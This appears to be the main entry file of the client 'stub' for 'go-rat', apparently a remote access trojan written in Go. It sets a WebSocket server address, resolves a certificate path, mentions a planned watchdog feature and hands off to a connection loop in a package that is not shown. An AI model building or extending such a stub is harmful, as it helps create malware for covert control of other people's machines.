package main

import (
	"go-rat/internal/stub"
	"log"
	"os"
	"path/filepath"
)

func main() {
	// Configuration will eventually come from build process or embedded config
	serverAddr := "wss://localhost:8080/ws" // Default server address for WebSocket
	
	// Determine certFile path.
	// If running from go-rat/cmd/stub: ../../certs/cert.pem
	// If running the built binary from go-rat/ (e.g. ./stub_binary): ./certs/cert.pem
	// For development, assume running from go-rat project root or that certs are in a known relative path.
	// A more robust solution for deployed stubs is to embed the cert or have a fixed relative path.
	
	executablePath, err := os.Executable()
	if err != nil {
		log.Fatalf("Failed to get executable path: %v", err)
	}
	executableDir := filepath.Dir(executablePath)
	
	// Default cert path, assuming certs dir is relative to the binary or project root
	// This might need adjustment based on actual deployment/build structure.
	// For now, let's assume 'certs/cert.pem' relative to where the stub is run,
	// or an absolute path if specified during build.
	// For simplicity in this step, we'll assume it's relative to the current working directory
	// when the stub is executed. This will be refined by the builder.
	certFile := "certs/cert.pem" 
	
	// Check if running from `go-rat/cmd/stub` during development
	cwd, _ := os.Getwd()
	if filepath.Base(cwd) == "stub" && filepath.Base(filepath.Dir(cwd)) == "cmd" {
		log.Println("Detected running from cmd/stub, adjusting cert path for development.")
		certFile = "../../certs/cert.pem"
	} else {
		log.Printf("Assuming certs/cert.pem is relative to executable or CWD: %s", cwd)
	}


	// Watchdog flag will be set by builder later. For now, assume false.
	// enableWatchdog := false // This would be read from config
	// if enableWatchdog {
	// 	log.Println("Watchdog feature would be enabled (not implemented yet).")
	// }

	log.Println("Starting stub client...")
	log.Printf("Attempting to connect to server: %s", serverAddr)
	log.Printf("Using server certificate: %s (ensure this path is correct)", certFile)
	
	// ConnectToServer contains the main loop for connection, message handling, and retries.
	stub.ConnectToServer(serverAddr, certFile)
}
